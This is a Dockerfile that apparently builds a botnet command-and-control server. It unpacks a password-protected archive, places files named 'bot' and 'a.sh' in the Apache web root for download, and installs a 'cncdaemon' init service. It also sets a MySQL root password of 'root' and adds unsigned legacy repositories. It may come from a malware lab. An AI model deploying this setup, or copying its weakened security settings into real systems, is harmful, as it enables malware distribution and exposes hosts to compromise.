FROM ubuntu:20.04

ARG DEBIAN_FRONTEND noninteractive

RUN echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections

RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y apt-transport-https

RUN DEBIAN_FRONTEND=noninteractive apt-get install -q -y --no-install-recommends dialog debconf-utils apt-utils apt-file pciutils software-properties-common wget curl gnupg nano unzip p7zip-full libbz2-dev net-tools dnsutils ifupdown procps iputils-ping

RUN DEBIAN_FRONTEND=noninteractive apt-get install -q -y apache2 telnet

WORKDIR /

RUN echo "deb [trusted=yes arch=amd64] http://archive.ubuntu.com/ubuntu/ xenial main" | tee -a /etc/apt/sources.list
RUN echo "deb [trusted=yes arch=amd64] http://archive.ubuntu.com/ubuntu/ xenial universe" | tee -a /etc/apt/sources.list

RUN echo "deb [trusted=yes arch=amd64] http://archive.ubuntu.com/ubuntu trusty universe" | tee -a /etc/apt/sources.list

RUN DEBIAN_FRONTEND=noninteractive apt-get update -y && echo "#!/bin/sh\nexit 0" > /usr/sbin/policy-rc.d && apt-get install -y debconf-utils && echo mysql-server mysql-server/root_password password root | debconf-set-selections && echo mysql-server mysql-server/root_password_again password root | debconf-set-selections && apt-get install -y mysql-server-5.7 -o pkg::Options::="--force-confdef" -o pkg::Options::="--force-confold" --fix-missing && apt-get install -y mysql-client-5.7

COPY conf /conf.7z

RUN 7z x conf.7z -p123456 && rm conf.7z

RUN mv a.sh bot /var/www/html/
RUN mv cncdaemon /etc/init.d/

RUN chmod +x /etc/init.d/cncdaemon

RUN chmod +x /prep.sh /dns.py /dhcp.py /cnc /db.sql
RUN mv -t /home/ /prep.sh /dns.py /dhcp.py /cnc

CMD /home/prep.sh